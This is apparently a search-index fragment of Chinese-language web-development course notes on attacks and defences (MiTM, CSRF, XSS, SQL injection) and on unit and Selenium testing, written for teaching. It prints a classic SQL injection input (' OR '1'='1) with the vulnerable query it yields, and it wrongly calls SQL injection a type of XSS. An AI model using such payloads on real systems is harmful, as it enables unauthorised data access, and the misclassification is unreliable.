(\u6ce8\u610f\uff1a\u5b9e\u9645\u5e94\u7528\u4e2d\u5e94\u786e\u4fdd\u73af\u5883\u53d8\u91cf\u5df2\u8bbe\u7f6e\uff0c\u907f\u514d\u4f7f\u7528\u9ed8\u8ba4\u56de\u9000\u5bc6\u94a5\uff0c\u6216\u4ec5\u5728\u5f00\u53d1\u73af\u5883\u4f7f\u7528)</p>"},{"location":"cs/mern/3403/l12/#attacks-and-defences","title":"Attacks and Defences","text":"<p>\u5c3d\u7ba1\u6709 session \u673a\u5236\uff0c\u4f46\u7f51\u7edc\u4ecd\u7136\u662f\u6839\u672c\u4e0d\u5b89\u5168\u7684\u3002</p>"},{"location":"cs/mern/3403/l12/#impersonation-attack","title":"Impersonation attack","text":"<p>Description\uff08\u63cf\u8ff0\uff09\uff1a\u7f51\u7edc\u5c06\u7528\u6237\u7684\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u4f2a\u9020\u7684\u670d\u52a1\u5668\u3002\u4f2a\u9020\u7684\u670d\u52a1\u5668\u884c\u4e3a\u4e0e\u771f\u5b9e\u670d\u52a1\u5668\u76f8\u540c\uff0c\u7528\u6237\u5411\u4f2a\u9020\u670d\u52a1\u5668\u63d0\u4ea4\u5bc6\u7801\u3001\u79c1\u6709\u6570\u636e\u7b49\u654f\u611f\u4fe1\u606f\u3002 Defence\uff08\u9632\u5fa1\uff09\uff1a\u670d\u52a1\u5668\u901a\u8fc7 Secure Socket Layer (SSL) protocol \u63d0\u4f9b\u7684\u8bc1\u4e66\u6765\u8bc1\u660e\u5176\u771f\u5b9e\u6027\u3002\u8bc1\u4e66\u7531\u53ef\u4fe1\u7b2c\u4e09\u65b9 Certificate Authority (CA) \u63d0\u4f9b\u3002\u670d\u52a1\u5668\u5411 CA \u53d1\u9001\u5176\u516c\u94a5 s_pub\uff0cCA \u9a8c\u8bc1\u540e\u8fd4\u56de (s_pub, Ec_priv(s_pub))\uff0c\u5176\u4e2d c_priv \u662f CA \u7684\u79c1\u94a5\u3002\u7528\u6237\u8054\u7cfb\u670d\u52a1\u5668\u65f6\uff0c\u670d\u52a1\u5668\u53d1\u9001 (s_pub, Ec_priv(s_pub))\u3002\u7528\u6237\u4f7f\u7528 CA \u7684\u516c\u94a5 c_pub \u6765\u6bd4\u8f83 s_pub \u548c Dc_pub(Ec_priv(s_pub))\u3002\u5982\u679c\u5339\u914d\uff0c\u7528\u6237\u5c31\u77e5\u9053 CA \u62c5\u4fdd\u670d\u52a1\u5668\u62e5\u6709\u516c\u94a5 s_pub\uff0c\u53ea\u6709\u771f\u5b9e\u670d\u52a1\u5668\u77e5\u9053\u79c1\u94a5 s_priv\u3002CA \u7684\u4fe1\u4efb\u95ee\u9898\u901a\u8fc7\u6839\u8bc1\u4e66\uff08root certificates\uff09\u89e3\u51b3\u3002</p>"},{"location":"cs/mern/3403/l12/#man-in-the-middle-attack-mitm","title":"Man-in-the-middle attack (MiTM)","text":"<p>Description\uff08\u63cf\u8ff0\uff09\uff1a\u5373\u4f7f\u4f7f\u7528\u8bc1\u4e66\uff0c\u7f51\u7edc\u4ecd\u53ef\u80fd\u6267\u884c MiTM \u653b\u51fb\u3002\u6240\u6709\u6d41\u91cf\u9996\u5148\u88ab\u91cd\u5b9a\u5411\u5230\u653b\u51fb\u8005\uff0c\u7136\u540e\u8f6c\u53d1\u7ed9\u771f\u5b9e\u670d\u52a1\u5668\u3002\u7528\u6237\u4e0e\u771f\u5b9e\u670d\u52a1\u5668\u4ea4\u4e92\uff0c\u8bc1\u4e66\u68c0\u67e5\u901a\u8fc7\u3002\u4f46\u653b\u51fb\u8005\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u6765\u5f80\u4fe1\u606f\uff0c\u5305\u62ec\u7b7e\u540d\u7684 cookie. Defence\uff08\u9632\u5fa1\uff09\uff1a\u65e0\u6cd5\u963b\u6b62\u7f51\u7edc\u91cd\u5b9a\u5411\u6d88\u606f\uff0c\u56e0\u6b64\u5fc5\u987b\u52a0\u5bc6\u6d88\u606f\u3002SSL \u5305\u542b\u4e00\u4e2a public key encryption \u8fc7\u7a0b\u6765\u5b9e\u73b0\u5b89\u5168 HTTP \u8bf7\u6c42\u3002\u5728\u8bc1\u4e66\u63e1\u624b\u540e\uff0c\u53cc\u65b9\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u534f\u8bae\u751f\u6210\u4e00\u7ec4\u5171\u4eab\u7684\u79c1\u6709 session \u5bc6\u94a5\u3002\u7136\u540e\u4f7f\u7528\u8fd9\u4e9b\u5bc6\u94a5\u52a0\u5bc6\u4f1a\u8bdd\u671f\u95f4\u7684\u6240\u6709\u540e\u7eed\u6d41\u91cf\u3002HTTP over SSL \u79f0\u4e3a HTTPS (HTTP Secure)\u3002\u73b0\u4ee3\u6d4f\u89c8\u5668\u4f1a\u6807\u8bb0\u4e0d\u4f7f\u7528 HTTPS \u7684\u7f51\u7ad9\u3002</p>"},{"location":"cs/mern/3403/l12/#cross-site-request-forgery-crsf-attack","title":"Cross-site request forgery (CRSF) attack","text":"<p>Description\uff08\u63cf\u8ff0\uff09\uff1a\u653b\u51fb\u8005\u5229\u7528\u7528\u6237\u53ef\u80fd\u5df2\u7ecf\u5728\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u4e8b\u5b9e\u3002\u653b\u51fb\u8005\u8bf1\u9a97\u7528\u6237\uff08\u4f8b\u5982\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u4e2d\u7684\u94fe\u63a5\uff09\u5411\u4ed6\u4eec\u5df2\u767b\u5f55\u7684\u7f51\u7ad9\u53d1\u51fa\u975e\u9884\u671f\u7684\u8bf7\u6c42\uff08\u4f8b\u5982\uff0c\u5411\u94f6\u884c\u7f51\u7ad9\u53d1\u8d77\u8f6c\u8d26\uff09\u3002\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u53d1\u9001\u4e0e\u8be5\u57df\u540d\u5173\u8054\u7684 cookie\u3002\u670d\u52a1\u5668\u68c0\u67e5 cookie\uff0c\u8ba4\u4e3a\u8bf7\u6c42\u6765\u81ea\u5408\u6cd5\u7528\u6237\uff0c\u5e76\u6267\u884c\u64cd\u4f5c\u3002 Defence\uff08\u9632\u5fa1\uff09\uff1a\u670d\u52a1\u5668\u5728\u6e32\u67d3\u8868\u5355\u65f6\uff0c\u751f\u6210\u4e00\u4e2a\u79d8\u5bc6\u4ee4\u724c\u5e76\u5c06\u5176\u5305\u542b\u5728\u8868\u5355\u4e2d\u3002\u4ee4\u724c\u662f\u4f7f\u7528 Flask secret key \u751f\u6210\u7684\u968f\u673a\u6570\uff0c\u653b\u51fb\u8005\u65e0\u6cd5\u4f2a\u9020\u3002\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u79d8\u5bc6\u4ee4\u724c\u5728 <code>validate_on_submit</code> \u671f\u95f4\u88ab\u68c0\u67e5\u3002\u8fd9\u6837\uff0c\u670d\u52a1\u5668\u53ea\u54cd\u5e94\u901a\u8fc7\u5b98\u65b9\u8868\u5355\u751f\u6210\u7684\u8bf7\u6c42\u3002WTForms \u63d0\u4f9b\u4e86 CRSF tokens \u6765\u9632\u5fa1\u3002\u6b64\u5916\uff0c\u5b89\u5168\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f1a\u975e\u5e38\u5feb\u901f\u5730\u8d85\u65f6\u7b7e\u540d\u7684 cookie\uff08\u4f8b\u5982\uff0c\u7ea6 5 \u5206\u949f\uff09\u3002</p> <p>Example (WTForms Token): \u5728 Flask \u6a21\u677f\u4e2d\u6e32\u67d3\u8868\u5355\u65f6\uff0c\u5305\u542b\u9690\u85cf\u5b57\u6bb5 <code>{{ form.csrf_token }}</code>\u3002WTForms \u4f1a\u81ea\u52a8\u751f\u6210\u5e76\u9a8c\u8bc1\u6b64\u4ee4\u724c\u3002</p>"},{"location":"cs/mern/3403/l12/#cross-site-scripting-xss-attack","title":"Cross-site scripting (XSS) attack","text":"<p>Description\uff08\u63cf\u8ff0\uff09\uff1a\u7edd\u4e0d\u5e94\u76f4\u63a5\u5305\u542b\u672a\u7ecf\u9a8c\u8bc1\u7684\u7528\u6237\u8f93\u5165\u5230\u53ef\u6267\u884c\u4ee3\u7801\u4e2d\u3002\u5982\u679c\u8fd9\u6837\u505a\uff0c\u6076\u610f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u975e\u9884\u671f\u7684\u8f93\u5165\u9003\u9038\uff08escape\uff09\u5f53\u524d\u8bed\u53e5\u5e76\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 SQL Injection \u662f\u4e00\u79cd\u5e38\u89c1\u7684 XSS \u653b\u51fb\u3002\u4f8b\u5982\uff0c\u76f4\u63a5\u6784\u5efa SQL \u67e5\u8be2\u65f6\uff0c\u7528\u6237\u53ef\u4ee5\u63d0\u4f9b\u5f62\u5982 <code>\"name; X\"</code> \u7684 ID\uff0c\u5176\u4e2d \"X\" \u662f\u4efb\u610f SQL \u8bed\u53e5\uff0c\u5bfc\u81f4\u6267\u884c\u975e\u9884\u671f\u6216\u6076\u610f\u7684\u6570\u636e\u5e93\u64cd\u4f5c\u3002 Defence\uff08\u9632\u5fa1\uff09\uff1a\u6e05\u7406\u7528\u6237\u8f93\u5165\u3002\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u81ea\u52a8\u8f6c\u4e49\uff08escape\uff09\u8f93\u5165\u5b57\u7b26\u4e32\u4e2d\u7684\u4efb\u4f55\u63a7\u5236\u5b57\u7b26\u3002\u5728 SQL \u4e2d\u6d89\u53ca\u5728\u5b57\u7b26\u524d\u63d2\u5165\u53cd\u659c\u6760\u3002SQLAlchemy \u7684 <code>query</code> API \u4f1a\u81ea\u52a8\u8f6c\u4e49\u4efb\u4f55\u4f20\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982 <code>Student.query.get(id)</code> \u4f1a\u81ea\u52a8\u8f6c\u4e49 id \u4e2d\u7684\u6240\u6709\u5185\u5bb9\u3002\u540c\u6837\uff0cJinja \u4f1a\u81ea\u52a8\u8f6c\u4e49\u4efb\u4f55\u66ff\u6362\u5230 HTML \u6a21\u677f\u4e2d\u7684\u5b57\u7b26\u4e32\u3002\u5176\u4ed6\u65b9\u6cd5\u5305\u62ec\u8f93\u5165\u9a8c\u8bc1\u548c prepared queries\u3002</p> <p>Example (SQL Injection): \u5047\u8bbe\u6709\u6613\u53d7\u653b\u51fb\u7684 SQL \u67e5\u8be2: <code>SELECT * FROM students WHERE id = '{user_input}'</code> \u6076\u610f\u7528\u6237\u8f93\u5165: <code>' OR '1'='1</code> \u5b9e\u9645\u6267\u884c\u7684\u67e5\u8be2\u53d8\u6210: <code>SELECT * FROM students WHERE id = '' OR '1'='1'</code>\uff0c\u53ef\u80fd\u8fd4\u56de\u6240\u6709\u5b66\u751f\u7684\u6570\u636e\u3002</p> <p>Example (SQLAlchemy Defence): \u4f7f\u7528 SQLAlchemy: <code>Student.query.get(user_input_id)</code> \u5373\u4f7f <code>user_input_id</code> \u5305\u542b\u6076\u610f\u5b57\u7b26\u4e32\uff0cSQLAlchemy \u4f1a\u81ea\u52a8\u8f6c\u4e49\uff0c\u4ece\u800c\u9632\u6b62 SQL \u6ce8\u5165\u3002</p>"},{"location":"cs/mern/3403/l12/#group-project-security-expectations","title":"Group Project Security Expectations","text":"<p>\u5728\u5c0f\u7ec4\u9879\u76ee\u4e2d\uff0c\u4e0d\u671f\u671b\u5b9e\u73b0\u5b8c\u6574\u7684\u5b89\u5168\u6027\u3002\u671f\u671b\u505a\u5230\uff1a *   \u4f7f\u7528 Flask-Login \u5b9e\u73b0\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u3002 *   \u4f7f\u7528 SQLAlchemy \u907f\u514d Cross-Site Scripting \u653b\u51fb\u3002 *   \u4f7f\u7528 WTForms tokens \u907f\u514d CRSF \u653b\u51fb\u3002 *   \u6b63\u786e\u5730\u6563\u5217\uff08hash\uff09\u5e76\u52a0\u76d0\uff08salt\uff09\u5bc6\u7801\u3002</p> <p>\u4e0d\u671f\u671b\u505a\u5230\uff1a *   \u83b7\u53d6 SSL \u8bc1\u4e66\u6216\u8bbe\u7f6e HTTPS\u3002 *   \u5b9e\u73b0\u57fa\u4e8e\u4ee4\u724c\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002</p> <p>Complete security \u662f\u975e\u5e38\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u672c\u5355\u5143\u4e0d\u4f1a\u6df1\u5165\u63a2\u8ba8\u3002\u7f51\u7edc\u59cb\u7ec8\u662f\u4e0d\u53ef\u4fe1\u7684\u3002</p>"},{"location":"cs/mern/3403/l13/","title":"13.0 Testing","text":""},{"location":"cs/mern/3403/l13/#types-of-tests","title":"Types of Tests","text":"<p>\u5728\u8f6f\u4ef6\u5f00\u53d1\u4e2d\uff0c\u5c24\u5176\u662f\u5728 <code>Agile</code> \u5f00\u53d1\u4e2d\uff0c\u6d4b\u8bd5\u662f\u5173\u952e\u6d3b\u52a8\u3002\u6d4b\u8bd5\u5957\u4ef6\u901a\u5e38\u53ef\u4f5c\u4e3a\u9700\u6c42\u6587\u6863\u7684\u4ee3\u7406\u3002\u6709\u591a\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5c06\u6d4b\u8bd5\u5206\u6210\u4e0d\u540c\u7c7b\u522b\u3002\u4e00\u79cd\u5206\u7c7b\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <ol> <li><code>Unit tests</code>\uff08\u5355\u5143\u6d4b\u8bd5\uff09\uff1a\u6d4b\u8bd5\u5355\u4e2a\u51fd\u6570\uff0c\u786e\u4fdd\u5176\u884c\u4e3a\u6b63\u786e\u3002<ul> <li>\u4f8b\u5982\uff0c\u6d4b\u8bd5\u51fd\u6570 <code>calculate_total_price</code> \u662f\u5426\u8fd4\u56de\u6b63\u786e\u7ed3\u679c\u3002</li> </ul> </li> <li><code>Integration test</code>\uff08\u96c6\u6210\u6d4b\u8bd5\uff09\uff1a\u6267\u884c\u6bcf\u4e2a\u573a\u666f\uff0c\u786e\u4fdd\u6a21\u5757\u6b63\u786e\u96c6\u6210\u3002<ul> <li>\u6d4b\u8bd5\u7531\u591a\u4e2a\u51fd\u6570\u7ec4\u5408\u800c\u6210\u7684\u66f4\u5927\u573a\u666f\u3002\u4f8b\u5982\uff0c\u6d4b\u8bd5\u521b\u5efa\u65b0\u7528\u6237\u662f\u5426\u6210\u529f\uff0c\u4e0d\u4ec5\u68c0\u67e5\u521b\u5efa\u51fd\u6570\u8f93\u51fa\uff0c\u8fd8\u68c0\u67e5\u6570\u636e\u5e93\u4e2d\u662f\u5426\u5b58\u5728\u8be5\u7528\u6237\u3002</li> </ul> </li> <li><code>System test</code>\uff08\u7cfb\u7edf\u6d4b\u8bd5\uff09\uff1a\u96c6\u6210\u771f\u5b9e\u786c\u4ef6\u5e73\u53f0\u5e76\u6d4b\u8bd5\u5176\u884c\u4e3a\u3002<ul> <li>\u5728 Web \u5f00\u53d1\u4e2d\uff0c\u8fd9\u6307\u7684\u662f\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u884c\u4e3a\u3002</li> </ul> </li> <li><code>Acceptance test</code>\uff08\u9a8c\u6536\u6d4b\u8bd5\uff09\uff1a\u901a\u8fc7\u7528\u6237\u754c\u9762\u8fd0\u884c\u5b8c\u6574\u7684\u7528\u6237\u573a\u666f\u3002<ul> <li>\u6d4b\u8bd5\u7528\u6237\u6545\u4e8b\uff0c\u9a8c\u8bc1\u7528\u6237\u662f\u5426\u80fd\u591f\u5b8c\u6210\u7279\u5b9a\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u6d4b\u8bd5\u7528\u6237\u662f\u5426\u80fd\u6253\u5f00\u62a5\u544a\u5e76\u7f16\u8f91\u67d0\u4e00\u884c\u3002</li> </ul> </li> </ol> <p><code>V model</code> \u5c06\u4e0d\u540c\u7c7b\u578b\u7684\u6d4b\u8bd5\u94fe\u63a5\u5230\u5f00\u53d1\u8fc7\u7a0b\u7684\u4e0d\u540c\u9636\u6bb5\u3002\u5728\u672c\u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8 <code>Unit tests</code> \u548c <code>System tests</code>\u3002\u5bf9\u4e8e\u5c0f\u7ec4\u9879\u76ee\uff0c\u671f\u671b\u6709\u826f\u597d\u7684 <code>Unit tests</code> \u548c <code>Selenium WebDriver</code> \u6d4b\u8bd5\u9009\u62e9\uff0c\u4e0d\u671f\u671b\u6709 <code>integration</code> \u6216 <code>acceptance tests</code>\u3002</p>"},{"location":"cs/mern/3403/l13/#desirable-properties-of-unit-tests","title":"Desirable Properties of Unit Tests","text":"<p><code>Unit test</code> \u7684\u76ee\u7684\u662f\u6d4b\u8bd5\u5355\u4e2a\u51fd\u6570\u4ee5\u786e\u4fdd\u5176\u884c\u4e3a\u6b63\u786e\u3002\u4e3a\u4e86\u8986\u76d6\u6240\u6709\u8fb9\u7f18\u60c5\u51b5\uff0c\u901a\u5e38\u6bcf\u4e2a\u51fd\u6570\u9700\u8981 2 \u5230 5 \u4e2a\u5355\u5143\u6d4b\u8bd5\u3002\u5355\u5143\u6d4b\u8bd5\u7684\u5c5e\u6027\u5305\u62ec\uff1a 1.  <code>It should be automated</code>\uff08\u5e94\u8be5\u662f\u81ea\u52a8\u5316\u7684\uff09\u2013 \u8fd0\u884c\u5b83\u4e0d\u5e94\u9700\u8981\u4eba\u5de5\u5e72\u9884\u3002 2.  <code>It should be repeatable</code>\uff08\u5e94\u8be5\u662f\u53ef\u91cd\u590d\u7684\uff09\u2013 \u5b83\u4e0d\u5e94\u66f4\u65b0\u6301\u4e45\u72b6\u6001\uff0c\u4f8b\u5982\u5916\u90e8\u6570\u636e\u5e93\u3002 3.  <code>It should run quickly</code>\uff08\u5e94\u8be5\u5feb\u901f\u8fd0\u884c\uff09\u2013 \u5355\u5143\u6d4b\u8bd5\u4f1a\u5f88\u591a\uff0c\u6240\u4ee5\u6bcf\u4e2a\u6d4b\u8bd5\u90fd\u5e94\u5feb\u901f\u3002 4.  <code>It should pinpoint the failure</code>\uff08\u5e94\u8be5\u80fd\u7cbe\u786e\u5b9a\u4f4d\u5931\u8d25\uff09\u2013 \u5982\u679c\u5931\u8d25\uff0c\u5e94\u8be5\u80fd\u627e\u5230\u95ee\u9898\u3002\u9519\u8bef\u6d88\u606f\u5e94\u8be5\u63d0\u4f9b\u8bca\u65ad\u4fe1\u606f\u3002 5.  <code>It should be limited in scope</code>\uff08\u8303\u56f4\u5e94\u6709\u9650\uff09\u2013 \u5bf9\u51fd\u6570\u5916\u90e8\u4efb\u4f55\u5185\u5bb9\u7684\u66f4\u6539\u4e0d\u5e94\u5f71\u54cd\u8be5\u51fd\u6570\u7684\u6d4b\u8bd5\u662f\u5426\u901a\u8fc7\u3002  </p> <p>\u4e3a\u4e86\u89e3\u51b3\u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff0c\u5373\u9694\u79bb <code>system under test (SUT)</code>\uff08\u88ab\u6d4b\u7cfb\u7edf\uff09\u4e0e\u5916\u90e8\u7cfb\u7edf\uff0c\u6211\u4eec\u4f7f\u7528 <code>test doubles</code>\uff08\u6d4b\u8bd5\u66ff\u8eab\uff09\uff1a<code>fakes</code>\u3001<code>stubs</code> \u548c <code>mocks</code>\u3002</p>"},{"location":"cs/mern/3403/l13/#test-doubles-fakes-mocks-stubs","title":"Test Doubles: Fakes, Mocks, Stubs","text":"<p><code>Test doubles</code> \u7528\u4e8e\u9694\u79bb\u88ab\u6d4b\u7cfb\u7edf\u4e0e\u5176\u5916\u90e8\u4f9d\u8d56\u3002</p> <ul> <li><code>Fakes</code>\uff08\u5047\u5bf9\u8c61\uff09\u662f\u5177\u6709\u5de5\u4f5c\u5b9e\u73b0\u7684\u5bf9\u8c61\uff0c\u4f46\u4e0e\u751f\u4ea7\u73af\u5883\u4e0d\u540c\u3002  <ul> <li>\u4f8b\u5982\uff0c\u7528\u4e00\u4e2a\u5305\u88c5 <code>HashMap</code> \u7684\u5bf9\u8c61\u6765\u6a21\u62df\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u5b9e\u9645\u6570\u636e\u5e93\u3002Flask \u4e2d\u53ef\u4ee5\u901a\u8fc7 <code>sqlite:///:memory:</code> \u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u7684\u975e\u6301\u4e45\u6027\u5185\u5b58\u6570\u636e\u5e93\u6a21\u62df\u3002  </li> </ul> </li> <li><code>Stubs</code>\uff08\u6869\u5bf9\u8c61\uff09\u662f\u6301\u6709\u9884\u5b9a\u4e49\u6570\u636e\u4ee5\u54cd\u5e94\u7279\u5b9a\u8bf7\u6c42\u7684\u5bf9\u8c61\uff0c\u4f46\u4e0d\u63d0\u4f9b\u5b8c\u6574\u529f\u80fd\u3002  <ul> <li>\u4f8b\u5982\uff0c\u4e00\u4e2a\u6869\u6570\u636e\u5e93\u7cfb\u7edf\u53ea\u4e3a\u6bcf\u4e2a\u5b66\u751f\u63d0\u4f9b\u56fa\u5b9a\u7684\u9884\u5b9a\u6210\u7ee9\u96c6\uff0c\u7528\u4e8e\u6d4b\u8bd5 <code>averageGrades</code> \u51fd\u6570\u3002\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\u4e3a\u6d4b\u8bd5\u767b\u5f55 GUI \u63d0\u4f9b\u4e00\u4e2a\u6869\uff0c\u8be5\u6869\u53ea\u63a5\u53d7\u5bc6\u7801 'pw'\uff0c\u65e0\u8bba\u7528\u6237\u662f\u8c01\u3002  </li> </ul> </li> <li><code>Mocks</code>\uff08\u6a21\u62df\u5bf9\u8c61\uff09\u7684\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c <code>stubs</code>\uff0c\u4f46\u5b83\u4eec\u4f1a\u8bb0\u4f4f\u63a5\u6536\u5230\u7684\u8c03\u7528\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u65ad\u8a00\u6267\u884c\u4e86\u6b63\u786e\u7684\u64cd\u4f5c\u6216\u53d1\u9001\u4e86\u6b63\u786e\u7684\u6d88\u606f\u3002  <ul> <li>\u4f8b\u5982\uff0c\u4f7f\u7528\u95e8\u7a97\u6a21\u62df\u6765\u9a8c\u8bc1\u662f\u5426\u8c03\u7528\u4e86 <code>close()</code> \u65b9\u6cd5\uff0c\u800c\u65e0\u9700\u4e0e\u771f\u5b9e\u786c\u4ef6\u4ea4\u4e92\u3002</li> </ul> </li> </ul> <p>\u5728\u5c0f\u7ec4\u9879\u76ee\u4e2d\uff0c\u4e0d\u671f\u671b\u81ea\u5df1\u521b\u5efa <code>mocks, fakes, stubs</code>\u3002</p>"},{"location":"cs/mern/3403/l13/#high-level-structure-of-unit-tests-python-unittest","title":"High-level Structure of Unit Tests (Python unittest)","text":"<p>\u5728 Python \u4e2d\uff0c\u5355\u5143\u6d4b\u8bd5\u901a\u5e38\u4f7f\u7528 <code>unittest</code> \u6a21\u5757\u3002</p> <ul> <li><code>Test fixtures</code>\uff08\u6d4b\u8bd5\u5939\u5177\uff09\uff1a\u7528\u4e8e\u51c6\u5907\u6d4b\u8bd5\u7528\u4f8b\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u5728\u6bcf\u4e2a\u6d4b\u8bd5\u8fd0\u884c\u524d\u6267\u884c\u7684 <code>setUp</code> \u548c\u5728\u6bcf\u4e2a\u6d4b\u8bd5\u8fd0\u884c\u540e\u6267\u884c\u7684 <code>tearDown</code>\u3002\u8fd9\u4e9b\u65b9\u6cd5\u7528\u4e8e\u521d\u59cb\u5316\u548c\u6e05\u7406\u7cfb\u7edf\u72b6\u6001\uff0c\u5982\u8bbe\u7f6e\u6216\u6e05\u9664\u6d4b\u8bd5\u6570\u636e\u5e93\u3002</li> <li><code>TestCase</code>\uff08\u6d4b\u8bd5\u7528\u4f8b\uff09\uff1a\u8fd9\u662f\u4e00\u4e2a\u8fd0\u884c\u6d4b\u8bd5\u7684\u6807\u51c6\u7c7b\u3002\u901a\u5e38\u901a\u8fc7\u7ee7\u627f <code>unittest.TestCase</code> \u7c7b\u6765\u7f16\u5199\u6d4b\u8bd5\u3002\u5b83\u6307\u5b9a\u4e86\u6d4b\u8bd5\u5939\u5177\u548c\u8981\u6267\u884c\u7684\u51fd\u6570\u3002</li> <li>\u6d4b\u8bd5\u65b9\u6cd5\uff1a\u5728 <code>TestCase</code> \u5b50\u7c7b\u4e2d\uff0c\u6bcf\u4e2a\u6d4b\u8bd5\u90fd\u662f\u4e00\u4e2a\u65b9\u6cd5\uff0c\u540d\u79f0\u5fc5\u987b\u4ee5 <code>test</code> \u5f00\u5934\u3002</li> <li><code>Assertions</code>\uff08\u65ad\u8a00\uff09\uff1a\u65ad\u8a00\u63cf\u8ff0\u4e86\u6d4b\u8bd5\u6267\u884c\u7684\u68c0\u67e5\u3002\u5982\u679c\u65ad\u8a00\u4e3a\u771f\uff0c\u6d4b\u8bd5\u901a\u8fc7\u3002\u6bcf\u4e2a\u6d4b\u8bd5\u53ef\u4ee5\u6709\u591a\u4e2a\u65ad\u8a00\uff0c\u53ea\u6709\u6240\u6709\u65ad\u8a00\u90fd\u4e3a\u771f\uff0c\u6d4b\u8bd5\u624d\u901a\u8fc7\u3002<code>unittest</code> \u5305\u63d0\u4f9b\u4e86\u8bb8\u591a\u73b0\u6709\u65ad\u8a00\u65b9\u6cd5\uff0c\u4f8b\u5982 <code>assertTrue</code>, <code>assertFalse</code>, <code>assertEqual</code>, <code>assertRaises</code> \u7b49\u3002\u65ad\u8a00\u53ef\u4ee5\u9644\u5e26\u6d88\u606f\uff0c\u63d0\u4f9b\u5931\u8d25\u6848\u4f8b\u7684\u8bca\u65ad\u4fe1\u606f\u3002</li> <li><code>TestSuite</code>\uff08\u6d4b\u8bd5\u5957\u4ef6\uff09\uff1a\u5141\u8bb8\u5c06\u6d4b\u8bd5\u7528\u4f8b\u5206\u7ec4\u4ee5\u4fbf\u4e00\u6b21\u8fd0\u884c\u3002</li> <li><code>TestRunner</code>\uff08\u6d4b\u8bd5\u8fd0\u884c\u5668\uff09\uff1a\u8d1f\u8d23\u8fd0\u884c\u6d4b\u8bd5\u548c\u62a5\u544a\u7ed3\u679c\u7684\u7c7b\u3002</li> </ul> <p>\u901a\u5e38\uff0c\u53ea\u9700\u8981\u7f16\u5199 <code>TestCase</code> \u548c\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u5176\u4f59\u5927\u90e8\u5206\u662f\u81ea\u52a8\u5316\u7684\u3002\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u8fd0\u884c\u6d4b\u8bd5\uff1a<code>python -m unittest &lt;filename&gt;</code>\u3002</p> <p>\u4e3a\u4e86\u6d4b\u8bd5 Flask \u5e94\u7528\uff0c\u6211\u4eec\u4e0d\u5e0c\u671b\u4f7f\u7528\u4e3b\u6570\u636e\u5e93\u3002\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6a21\u62df\u6570\u636e\u5e93\u3002\u4f46\u5e94\u7528\u7ed3\u6784\u53ef\u80fd\u9700\u8981\u91cd\u6784\u4ee5\u652f\u6301\u4e0d\u540c\u914d\u7f6e\u9009\u9879\uff08\u4f8b\u5982\u6d4b\u8bd5\u914d\u7f6e\u548c\u90e8\u7f72\u914d\u7f6e\uff09\u3002\u8fd9\u901a\u5e38\u6d89\u53ca\u521b\u5efa\u4e00\u4e2a\u5de5\u5382\u65b9\u6cd5 (<code>create_app</code>) \u6765\u6839\u636e\u4e0d\u540c\u914d\u7f6e\u521b\u5efa\u5e94\u7528\u5b9e\u4f8b\u3002\u4e3a\u4e86\u5728\u591a\u4e2a\u5e94\u7528\u5b9e\u4f8b\uff08\u90e8\u7f72\u548c\u6d4b\u8bd5\uff09\u4e2d\u6ce8\u518c\u76f8\u540c\u7684\u8def\u7531\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>blueprint</code>\u3002<code>blueprint</code> \u53ef\u4ee5\u88ab\u89c6\u4e3a\u4e00\u4e2a\u63a5\u53e3\uff0c\u58f0\u660e\u4e86\u4e00\u7ec4\u8def\u7531\u800c\u65e0\u9700\u521b\u5efa\u5e94\u7528\u5b9e\u4f8b\u3002</p>"},{"location":"cs/mern/3403/l13/#browser-testing-selenium","title":"Browser Testing (Selenium)","text":"<p><code>System tests</code> \u5728 Web \u4e2d\u610f\u5473\u7740\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u884c\u4e3a\u3002<code>Selenium</code> \u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u4e8e\u81ea\u52a8\u5316\u6d4f\u89c8\u5668\u7684\u7a0b\u5e8f\uff0c\u4ee5\u8fd0\u884c\u6d4b\u8bd5\u7528\u4f8b\u3002\u5b83\u6709\u4e24\u79cd\u53d8\u4f53\uff1a</p> <ul> <li><code>Selenium IDE</code>\uff1a\u4e00\u4e2a\u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u53ef\u4ee5\u8bb0\u5f55\u4e0e\u7f51\u7ad9\u7684\u4ea4\u4e92\u5e76\u91cd\u64ad\uff0c\u4ee5\u786e\u8ba4\u7ed3\u679c\u4fdd\u6301\u4e0d\u53d8\u3002<ul> 